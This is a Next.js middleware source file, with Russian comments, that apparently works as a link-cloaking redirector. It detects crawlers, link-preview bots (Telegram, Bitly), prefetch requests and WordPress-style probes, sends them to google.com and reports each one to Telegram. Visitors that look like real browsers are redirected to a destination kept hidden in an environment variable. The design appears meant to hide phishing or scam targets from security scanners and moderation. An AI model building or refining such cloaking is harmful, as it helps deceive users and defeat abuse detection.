// File: middleware.ts
// Next.js middleware (Edge runtime) — НЕ читает секреты в глобальной области.
// Все env читаются внутри handler и Telegram-уведомления отправляются в Netlify Function.

import { NextResponse } from "next/server";

const BOT_JSON_URL = "https://raw.githubusercontent.com/arcjet/well-known-bots/main/well-known-bots.json";
const BOT_LIST_TTL = 60 * 60 * 1000; // 1 hour
const TELEGRAM_TIMEOUT_MS = 2700; // timeout for calling the serverless notify endpoint
const STATIC_BOT_REGEXES = [
  /\btelegrambot\b/i,
  /\bbitlybot\b/i,
  /\bbitlypreview\b/i,
  /\blinkpreview\b/i,
  /\burlpreview\b/i,
];

const HUMAN_HEADER_HINTS = [
  "accept-language",
  "sec-ch-ua",
  "sec-fetch-site",
  "sec-fetch-mode",
  "upgrade-insecure-requests",
];

if (!globalThis.__bot_cache) {
  globalThis.__bot_cache = { regexes: [...STATIC_BOT_REGEXES], fetchedAt: 0, fetching: null } as any;
}

function getHeaderValue(req: any, name: string) {
  if (typeof req.headers?.get === "function") return req.headers.get(name);
  if (req.headers && typeof req.headers === "object") return req.headers[name];
  return undefined;
}

function getReferrerHostname(req: any) {
  const ref = getHeaderValue(req, "referer") || getHeaderValue(req, "referrer");
  if (!ref) return null;
  try {
    return new URL(ref).hostname.toLowerCase();
  } catch (e) {
    console.warn("Bad referer URL:", ref);
    return null;
  }
}

function looksLikeBrowserRequest(req: any, ua: string) {
  if (!ua) return false;

  const hasMozillaToken = /Mozilla\/\d/i.test(ua);
  const acceptLanguage = (getHeaderValue(req, "accept-language") || "").trim();

  if (!hasMozillaToken) return false;

  let hintCount = 0;
  for (const headerName of HUMAN_HEADER_HINTS) {
    const value = getHeaderValue(req, headerName);
    if (value) {
      hintCount += 1;
      if (hintCount >= 1) break;
    }
  }

  if (!acceptLanguage || acceptLanguage === "-" || !/[a-z]{2}(-[A-Z]{2})?/i.test(acceptLanguage.split(",")[0])) {
    return false;
  }

  if (hintCount >= 1) return true;

  const refererHeader = getHeaderValue(req, "referer") || getHeaderValue(req, "referrer");
  if (refererHeader && req.method?.toUpperCase?.() === "GET") return true;

  if (/Windows NT|Macintosh|Android|iPhone|iPad|Linux/i.test(ua)) return true;

  return false;
}

async function loadBotRegexes() {
  const now = Date.now();
  const cache: any = globalThis.__bot_cache;

  if (cache.regexes.length && now - cache.fetchedAt < BOT_LIST_TTL) return cache.regexes;

  if (cache.fetching) {
    try { await cache.fetching } catch(e) {}
    return cache.regexes;
  }

  cache.fetching = (async () => {
    try {
      const res = await fetch(BOT_JSON_URL, { cf: { cacheTtl: 3600 } } as any);
      if (!res.ok) {
        console.warn("bot list fetch failed", res.status);
        cache.fetching = null;
        return cache.regexes;
      }
      const json = await res.json();

      const regexes: RegExp[] = [];
      if (Array.isArray(json)) {
        for (const entry of json) {
          let pattern: string | null = null;
          if (typeof entry === "string") pattern = entry;
          else if (entry && typeof entry.pattern === "string") pattern = entry.pattern;
          else if (entry && typeof entry.ua === "string") pattern = entry.ua;
          if (!pattern) continue;

          let rx: RegExp | null = null;
          try {
            if (pattern.startsWith("/") && pattern.lastIndexOf("/") > 0) {
              const last = pattern.lastIndexOf("/");
              const body = pattern.slice(1, last);
              const flags = pattern.slice(last + 1);
              rx = new RegExp(body, flags.includes("i") ? flags : flags + "i");
            } else {
              try { rx = new RegExp(pattern, "i"); } catch (e) {
                rx = new RegExp(pattern.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "i");
              }
            }
          } catch (e) {
            continue;
          }
          if (rx) regexes.push(rx);
        }
      }
      const merged = new Map<string, RegExp>();
      for (const rx of [...STATIC_BOT_REGEXES, ...regexes]) {
        if (!rx) continue;
        const key = `${rx.source}__${rx.flags}`;
        if (!merged.has(key)) merged.set(key, rx);
      }
      cache.regexes = Array.from(merged.values());
      cache.fetchedAt = Date.now();
    } catch (e) {
      console.warn("Error loading bot patterns:", e?.message || e);
    } finally {
      cache.fetching = null;
    }
  })();

  await cache.fetching;
  return cache.regexes;
}

function getDomain(req: any) {
  try {
    const hostHeader = getHeaderValue(req, "x-forwarded-host") || getHeaderValue(req, "host");
    if (hostHeader) {
      return new URL("http://" + hostHeader).hostname;
    }

    const referer = getHeaderValue(req, "referer") || getHeaderValue(req, "referrer");
    if (referer) {
      try { return new URL(referer).hostname; } catch (e) { console.warn("Bad referer URL:", referer); }
    }

    const envUrl = process.env.URL || process.env.DEPLOY_URL;
    if (envUrl) {
      try { return new URL(envUrl).hostname; } catch (e) { return envUrl; }
    }
  } catch (err) {
    console.warn("getDomain failed:", err);
  }
  return "unknown-domain";
}

// вызывает Netlify Function, где хранятся секреты
async function notifyRemote(req: any, text: string) {
  try {
    const endpoint = new URL('/.netlify/functions/notify-telegram', req.url).toString();
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), TELEGRAM_TIMEOUT_MS);
    await fetch(endpoint, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ text, mainDomain: getDomain(req) }),
      signal: controller.signal,
    });
    clearTimeout(id);
  } catch (e) {
    // игнорируем ошибки уведомлений
    console.warn('notifyRemote failed (ignored)', e?.message || e);
  }
}

export async function middleware(req: any) {
  const ua = req.headers.get("user-agent") || "";
  const method = req.method?.toUpperCase?.() || "GET";
  const refererHeader = getHeaderValue(req, "referer") || getHeaderValue(req, "referrer") || "";
  const purposeHeader = (getHeaderValue(req, "purpose") || getHeaderValue(req, "sec-purpose") || "").toLowerCase();
  const secFetchDest = (getHeaderValue(req, "sec-fetch-dest") || "").toLowerCase();
  const isHumanLike = looksLikeBrowserRequest(req, ua);
  const url = req.nextUrl.pathname + (req.nextUrl.search || "");
  const ip = req.headers.get("x-forwarded-for") || req.headers.get("cf-connecting-ip") || "unknown";
  let envUrl = process.env.URL || process.env.DEPLOY_URL || "unknown-domain";

  const mainDomain = getDomain(req);
  try {
    envUrl = new URL(envUrl).host;
  } catch (e) {
    console.warn("Invalid envUrl:", envUrl);
  }

  const acceptLanguage = getHeaderValue(req, "accept-language") || "-";
  const secChUa = getHeaderValue(req, "sec-ch-ua") || getHeaderValue(req, "sec-ch-ua-full") || "-";
  const secChUaMobile = getHeaderValue(req, "sec-ch-ua-mobile") || "-";
  const secChUaPlatform = getHeaderValue(req, "sec-ch-ua-platform") || "-";

  let regexes: RegExp[] = [];
  try { regexes = await loadBotRegexes(); } catch (e) { console.warn("loadBotRegexes failed", e?.message || e); }

  const isBot = regexes.some(rx => { try { return rx.test(ua); } catch (e) { return false; } });

  const isPreview = /prefetch|preview|prerender/.test(purposeHeader) || secFetchDest === "empty";
  const suspiciousHead = method === "HEAD" && !refererHeader;
  const isIPv6 = ip.includes(":");

  const rawUrlForCheck = decodeURIComponent((url || "").toString()).replace(/\s+/g, " ");
  const rawRefererForCheck = decodeURIComponent((refererHeader || "").toString()).replace(/\s+/g, " ");

  const containsPhpOrXml = /(\.php\b|\.xml\b)/i.test(rawUrlForCheck + " " + rawRefererForCheck)
    || /(?:^|\/|[.\-])wp[-_]?/i.test(rawUrlForCheck + " " + rawRefererForCheck)
    || /wp-includes/i.test(rawUrlForCheck + " " + rawRefererForCheck);

  if (isBot || isPreview || suspiciousHead || containsPhpOrXml) {
    const reason = isBot
      ? "🚨 Known bot detected"
      : isPreview
        ? "🚨 Срабатывание Heuristic блокировки (purpose: preview/prefetch)"
        : containsPhpOrXml
          ? "🚨 Подозрительный запрос (referer или url содержит .php или .xml)"
            : "🚨 Срабатывание Heuristic блокировки (HEAD без referer)";

    // вызываем remote notify (serverless function с секретами)
    notifyRemote(req, `${reason}\nUA: ${ua}\nIP: ${ip}\nURL: ${url}\nReferer: ${refererHeader || "—"}\nMethod: ${method}\nPurpose: ${purposeHeader || "—"}`);

    return NextResponse.redirect("https://google.com");
  }

  if (!isHumanLike) {
    notifyRemote(req, `🚨 Подозрительный запрос (нет признаков браузера)\nUA: ${ua || "<пусто>"}\nIP: ${ip}\nURL: ${url}\nReferer: ${refererHeader || "—"}\nMethod: ${method}\nPurpose: ${purposeHeader || "—"}`);
    return NextResponse.redirect("https://google.com");
  }

  try {
    console.log(JSON.stringify({
      mainDomain,
      referer: refererHeader || "—",
      url,
      method,
      ip,
      ua: ua || "—",
      acceptLanguage,
      secChUa,
      secChUaMobile,
      secChUaPlatform,
      timestamp: new Date().toISOString()
    }));
  } catch (e) {
    console.log(`mainDomain: ${mainDomain} | Referer: ${refererHeader || "—"} | UA: ${ua || "—"} | IP: ${ip}`);
  }

  // Читаем URL_SITE динамически (не встраиваем в бандл)
  const URL_SITE = process.env.URL_SITE || "https://yahoo.com";
  const target = new URL(URL_SITE);
  target.searchParams.set("s3", mainDomain);

  return NextResponse.redirect(target.toString());
}

export const config = { matcher: ["/:path*"] };
